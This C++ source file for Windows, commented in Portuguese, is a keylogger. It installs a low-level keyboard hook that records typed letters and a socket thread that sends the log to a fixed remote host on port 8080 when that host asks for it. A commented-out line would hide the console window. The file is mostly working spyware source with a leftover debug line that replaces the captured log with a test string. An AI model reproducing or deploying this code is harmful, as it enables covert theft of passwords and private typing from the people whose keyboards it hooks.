//colocar -lwsock32 no linker
#include <winsock2.h>
#include <iostream>
#include <thread>
#include <string>

//Headers para o key logger:
#include <windows.h>
#include <locale.h>

//Declaração das variáveis, structs e classes:

	//Módulo de conexão:
const int wait_time_before_reconect = 15;
int sResult = 0;
std::string log = "";
const char* log_control = "";
WSADATA wsaData;
SOCKET clientSocket = INVALID_SOCKET;
struct sockaddr_in serverAddress;
char buffer[1024];

	//Keylogger:
char c = '\0';
bool capital_state = false;

//Declarando o Hook:
LRESULT CALLBACK KBDHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT *s = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
	
	switch (wParam){
		case WM_KEYDOWN:
		
			capital_state = false;
				if(GetKeyState(VK_CAPITAL) != 0){
					capital_state = true;
				}
	
				if(GetAsyncKeyState(VK_SHIFT)){
					if(GetKeyState(VK_CAPITAL) != 0){
						capital_state = false;
					}else{
						capital_state = true;
					}
				}
		
			//Tratamento:
			if(s->vkCode >= 0x41 & s->vkCode <= 0x5A){
				//Letas comuns
				c = MapVirtualKey(s->vkCode, MAPVK_VK_TO_CHAR); //Virtual Key Code
								
				if(capital_state == false){
					c = (char)tolower(c);
				}
				
				log += c;

		
			}else{
				//Teclas especiais:
				
				//ç
					if(s->vkCode == VK_OEM_1){
						if(capital_state == true){
							log += 'Ç';
						}else{
							log += 'ç';
						}
					}
			}
			break;
			
	}	
	
	//Libera o teclado para ser utilizado pelo sistema operacional novamente
	return CallNextHookEx(NULL, nCode, wParam, lParam);
	
}

//Declaração das funções
void connection();
void k_log();
void capital();




int main(){

setlocale(LC_ALL, "Portuguese");	
//FreeConsole();
std::thread t_connection(connection);
std::thread t_k_log(k_log);

t_connection.join();
t_k_log.join();

return 0;
}

//Implementação das funções:
void connection(){

if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
std::cerr << "Falha na inicialização do Winsock" << std::endl;
}
if ((clientSocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
std::cerr << "Falha na criação do socket" << std::endl;
WSACleanup();
}
serverAddress.sin_family = AF_INET;
serverAddress.sin_port = htons(8080);
serverAddress.sin_addr.s_addr = inet_addr("192.168.1.35");
if (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) < 0) {
std::cerr << "Erro na conexão com o servidor" << std::endl;
closesocket(clientSocket);
WSACleanup();
}

while(1){
	
	memset(buffer, 0, 1024);
	
if (recv(clientSocket, buffer, sizeof(buffer), 0) < 0) {
std::cerr << "Erro na recepção da resposta do servidor" << std::endl;
closesocket(clientSocket);
WSACleanup();
}

if(buffer[0] == 'R'){
	//Envia a resposta ao servidor
	std::cout << "Enviando " << log << " ao servidor\n";
	log = "testeeeeee";
	sResult = send(clientSocket, log.c_str(), strlen(log.c_str()), 0);
	log = "";
	
if (sResult < 0) {
std::cerr << "Erro no envio de dados ao servidor" << std::endl;
closesocket(clientSocket);
WSACleanup();
}
}else{
std::cout << "Falha no recebimento da flag\n";
}

std::cout << "Resposta do servidor: " << buffer << std::endl;

}//fim do while


closesocket(clientSocket);
WSACleanup();	
}

void k_log(){
	
	//Criando o hook: (WH_KWYBOARD_LL é o tipo de hook; ll significa Low Level)
	HHOOK kbd = SetWindowsHookEx(WH_KEYBOARD_LL, &KBDHook, 0, 0);
	
	MSG message;
	while (GetMessage(&message, NULL, NULL, NULL) > 0){
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
	
	UnhookWindowsHookEx(kbd);
}




